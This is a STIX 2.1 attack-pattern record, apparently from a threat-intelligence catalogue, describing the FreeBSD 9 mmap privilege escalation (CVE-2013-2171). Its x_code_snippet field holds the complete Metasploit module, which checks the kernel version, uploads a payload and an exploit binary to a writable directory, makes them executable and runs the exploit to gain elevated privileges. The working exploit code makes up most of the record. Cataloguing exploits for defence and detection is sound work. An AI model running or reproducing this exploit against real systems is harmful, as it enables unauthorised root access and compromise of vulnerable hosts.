{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--73c88866-2d63-4fbd-a4f3-806418d42fbf",
    "created": "2024-08-14T16:33:33.81854Z",
    "modified": "2024-08-14T16:33:33.818543Z",
    "name": "FreeBSD 9 Address Space Manipulation Privilege Escalation",
    "description": " This module exploits a vulnerability that can be used to modify portions of a process's address space, which may lead to privilege escalation.  Systems such as FreeBSD 9.0 and 9.1 are known to be vulnerable.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/local/mmap.rb",
            "external_id": "mmap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2171"
        },
        {
            "source_name": "reference",
            "url": "http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super( update_info( info, {\n        'Name'          => 'FreeBSD 9 Address Space Manipulation Privilege Escalation',\n        'Description'   => %q{\n          This module exploits a vulnerability that can be used to modify portions of\n          a process's address space, which may lead to privilege escalation.  Systems\n          such as FreeBSD 9.0 and 9.1 are known to be vulnerable.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        =>\n          [\n            'Konstantin Belousov',   # Discovery\n            'Alan Cox',              # Discovery\n            'Hunger',                # POC\n            'sinn3r'                 # Metasploit\n          ],\n        'Platform'      => [ 'bsd' ],\n        'Arch'          => [ ARCH_X86 ],\n        'SessionTypes'  => [ 'shell' ],\n        'References'    =>\n          [\n            [ 'CVE', '2013-2171' ],\n            [ 'OSVDB', '94414' ],\n            [ 'EDB', '26368' ],\n            [ 'BID', '60615' ],\n            [ 'URL', 'http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc' ]\n          ],\n        'Targets'       =>\n          [\n            [ 'FreeBSD x86', {} ]\n          ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2013-06-18',\n      }\n    ))\n    register_options([\n      # It isn't OptPath becuase it's a *remote* path\n      OptString.new(\"WritableDir\", [ true, \"A directory where we can write files\", \"/tmp\" ]),\n    ])\n\n  end\n\n  def check\n    res = cmd_exec('uname -a')\n    return Exploit::CheckCode::Appears if res =~ /FreeBSD 9\\.[01]/\n\n    Exploit::CheckCode::Safe\n  end\n\n  def upload_payload\n    fname = datastore['WritableDir']\n    fname = \"#{fname}/\" unless fname =~ %r'/$'\n    if fname.length > 36\n      fail_with(Failure::BadConfig, \"WritableDir can't be longer than 33 characters\")\n    end\n    fname = \"#{fname}#{Rex::Text.rand_text_alpha(4)}\"\n\n    p = generate_payload_exe\n    write_file(fname, p)\n    return nil if not file_exist?(fname)\n    cmd_exec(\"chmod +x #{fname}\")\n    fname\n  end\n\n  def generate_exploit(payload_fname)\n    #\n    # Metasm does not support FreeBSD executable generation.\n    #\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2013-2171.bin\")\n    x = File.open(path, 'rb') { |f| f.read(f.stat.size) }\n    x.gsub(/MSFABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890/, payload_fname.ljust(40, \"\\x00\"))\n  end\n\n  def upload_exploit(payload_fname)\n    fname = \"/tmp/#{Rex::Text.rand_text_alpha(4)}\"\n    bin = generate_exploit(payload_fname)\n    write_file(fname, bin)\n    return nil if not file_exist?(fname)\n    cmd_exec(\"chmod +x #{fname}\")\n    fname\n  end\n\n  def exploit\n    payload_fname = upload_payload\n    fail_with(Failure::NotFound, \"Payload failed to upload\") if payload_fname.nil?\n    print_status(\"Payload #{payload_fname} uploaded.\")\n\n    exploit_fname = upload_exploit(payload_fname)\n    fail_with(Failure::NotFound, \"Exploit failed to upload\") if exploit_fname.nil?\n    print_status(\"Exploit #{exploit_fname} uploaded.\")\n\n    register_files_for_cleanup(payload_fname, exploit_fname)\n\n    print_status(\"Executing #{exploit_fname}\")\n    cmd_exec(exploit_fname)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-18",
    "x_mitre_platforms": [
        "[ 'bsd' ]"
    ]
}